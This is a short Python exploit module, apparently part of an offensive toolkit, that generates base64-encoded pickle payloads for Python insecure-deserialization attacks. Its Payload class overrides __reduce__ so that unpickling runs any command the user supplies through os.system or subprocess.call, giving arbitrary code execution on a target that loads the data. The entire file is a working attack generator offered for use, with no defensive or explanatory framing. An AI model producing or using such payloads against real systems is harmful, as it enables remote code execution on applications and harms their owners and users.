import argparse
import os
import pickle
import base64
import getopt
import sys

def details():
    details = {'name': str(os.path.basename(__file__)).split('.')[0], 'category': 'exploit', 'description': 'Tool for creating payloads for exploiting Python Insecure Deserialization with pickle.', 'path': os.path.abspath(__file__)}
    return(details)

def module(args):
    argparser = argparse.ArgumentParser(add_help=False)
    argparser.add_argument("-p", "--payload", required=True)
    argparser.add_argument("-o", "--os", action="store_true", required=False)
    argparser.add_argument("-s", "--subprocess", action="store_true", required=False)
    cmd = argparser.parse_args(args)

    if cmd.subprocess == True:
        class Payload(object):
            def __reduce__(self):
                return(__import__('subprocess').call, (cmd.payload,))
    else:
        class Payload(object):
            def __reduce__(self):
                return(__import__('os').system, (cmd.payload,))

    pickled = pickle.dumps(Payload())
    bytes = base64.b64encode(pickled)
    output = bytes.decode('ascii')

    print(str(output))
    return(str(output))

if __name__ == '__main__':
    argparser = argparse.ArgumentParser(add_help=False)
    argparser.add_argument("-p", "--payload", required=True)
    argparser.add_argument("-o", "--os", action="store_true", required=False, default=True)
    argparser.add_argument("-s", "--subprocess", action="store_true", required=False)
    args = argparser.parse_args()

    if args.subprocess == True:
        class Payload(object):
            def __reduce__(self):
                return(__import__('subprocess').call, (args.payload,))
    else:
        class Payload(object):
            def __reduce__(self):
                return(__import__('os').system, (args.payload,))

    pickled = pickle.dumps(Payload())
    bytes = base64.b64encode(pickled)
    output = bytes.decode('ascii')

    print(str(output))